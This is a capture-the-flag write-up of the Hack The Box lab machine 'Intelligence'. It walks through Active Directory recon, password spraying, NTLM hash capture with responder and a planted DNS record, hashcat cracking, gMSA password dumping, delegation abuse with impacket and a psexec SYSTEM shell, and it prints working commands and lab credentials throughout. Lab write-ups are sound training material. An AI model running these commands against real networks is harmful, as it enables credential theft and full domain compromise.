---
title: "Intelligence - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - medium
  - windows
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Intelligence
![](https://kar0nx.github.io/assets/images/writeup/78c5d8511bae13864c72ba8df1329e8d.png)
## Reconnaissance

IP: 10.10.10.248
## NMAP

```
nmap -T4 -p- -A 10.10.10.248
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 16:31 UTC
Nmap scan report for 10.10.10.248
Host is up (0.028s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-18 23:33:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-09-18T23:35:03+00:00; +7h00m03s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-18T23:35:03+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-18T23:35:03+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16                                                                                               
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)     
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2025-09-18T23:35:03+00:00; +7h00m03s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (96%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (96%), Microsoft Windows 10 1903 - 21H1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-18T23:34:25
|_  start_date: N/A
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   28.03 ms 10.10.14.1
2   28.08 ms 10.10.10.248

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 189.28 seconds
```

adding intelligence.htb dc dc.intelligence.htb to /etc/hosts

We know that is active directory set, enumerating smb, ldap, kerberos but didn't find anything usefull so let's skip to website
## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918183214.png)

we have 2 download buttons let's check it in burp 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918183420.png)

Nothing special in burp, but we may search for other pfd files we know syntax
```
http://intelligence.htb/documents/2020-12-15-upload.pdf
http://intelligence.htb/documents/2020-01-01-upload.pdf
```

Year month day upload.pdf.
Let's create simple bash script to generate whole year

```
#!/bin/bash

YEAR=2020
OUTPUT="lista.txt"

## Generujemy wszystkie dni roku 2020
for day in $(seq 0 365); do
    DATE=$(date -d "$YEAR-01-01 +$day days" +"%Y-%m-%d")
    echo "${DATE}-upload.pdf" >> "$OUTPUT"
done
```

great and now let's run ffuf to find valid 

```
ffuf -w lista.txt -u http://intelligence.htb/documents/FUZZ
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918185600.png)

checked 1 to confirm 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918185752.png)

and here I found default password: NewIntelligenceCorpUser9876
Next I will create list of valid pdf files save ffuf output to valid.txt and then

```
cat valid.txt | awk '{print $1}' > valided.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918190316.png)

next I ran oneline script to download all this pdf files

```
for i in $(cat valided.txt); do curl -s -O "http://intelligence.htb/documents/$i"; done
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918191531.png)

Searching google for best tool to convert pdf to txt I found pdftotext, install it with
```
sudo apt-get install poppler-utils
```

and run

```
for i in $(ls); do pdftotext $i; done
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918191623.png)

Now we can grep for sensitive information in all files.

```
grep -Ei (user|pass|pwd) *.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918192051.png)

Funny checked all files and didn't find anything new :D
Then I ran exiftool on this file and in creator I found username, let's do it for all files.

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918192034.png)

and I got bunch of differente users. Filtered them and make a list, I will only provide last command to not waste your time

```
exiftool *.pdf | grep Creator | awk '{print $3}' > usernames.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918192352.png)

## Gaining Access

Now what, we need to check for valid users with kerbrute.

```
kerbrute userenum -d intelligence.htb --dc 10.10.10.248 usernames.txt -o validusers.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918192658.png)

all 84 users (maybe some duplicated but doesn't matter) are valid, now let's try password that we found 

```
nxc smb 10.10.10.248 -u usernames.txt -p 'NewIntelligenceCorpUser9876' --continue-on-succes
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918192936.png)

and we got a hit, finally.

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918193130.png)

We have access to few shares will check IT and Users
Had some trouble with checking smb via nxc so I switched to good old friend smbclient

```
smbclient \\\\10.10.10.248\\IT -U Tiffany.Molina
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918193441.png)

```
smbclient \\\\10.10.10.248\\Users -U Tiffany.Molina
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918193803.png)

it looks like share on c:/users
We can take first flag from here

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918194022.png)

## Privilege Escalation

In IT share we also find custom script downdetector.ps1 
Script runs every 5min and grab list of computers starting with "web*" it will try to iwr and if status won't be 200 it will email Ted.Graves

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918194208.png)

And now I stuck, checked 0xdf writeup and figure out how to move. 
We need to capture ted graves ntmlv2 hash via dnstool.py
https://github.com/dirkjanm/krbrelayx

Start responder in 1 window

```
responder -I tun0 -A
```

and run script in second

```
python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-karon --data 10.10.14.13 10.10.10.248
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918195424.png)

Now we need to wait max to 5min to get a hash

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918195525.png)

Great, crack it via hashcat module 5600

```
hashcat -m 5600 hash  /usr/share/wordlists/rockyou.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918195801.png)

TED.GRAVES   Mr.Teddy
Checking Ted we have access to same shares nothing more, so let's run bloodhound 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250918195924.png)

```
bloodhound-python -d intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' -ns 10.10.10.248 -c all
```

In bloodhound I found path to domain from ted graves

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919075201.png)

Ok, so let's start with readings GMSAPassword of svc_int user, I will use gMSADumper.py

```
python3 gMSADumper.py -u 'TED.GRAVES' -p 'Mr.Teddy' -d 'intelligence.htb'
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919075528.png)

While reading about gmsa passwords I found better way 

```
nxc ldap intelligence.htb -u 'TED.GRAVES' -p 'Mr.Teddy' --gmsa
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919080037.png)

Now we have svc_int ntlm hash, moving on to the last part of this machine we need to abuse AllowedToDelegate to impersonate Administrator to get access to dc.
Quick check spn

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919080738.png)

Next synchronize our time with DC and run getst from impacket

```
ntpdate 10.10.10.248
```

```
impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :1dcabcce2cf522bae77d7dc622587879 -impersonate administrator intelligence.htb/svc_int
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919081230.png)

Now we have to import ccache and connect to dc via smb

```
KRB5CCNAME=administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache impacket-psexec -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250919081711.png)

We have system shell, grab your root flag

```
type c:\users\administrator\desktop\root.txt
```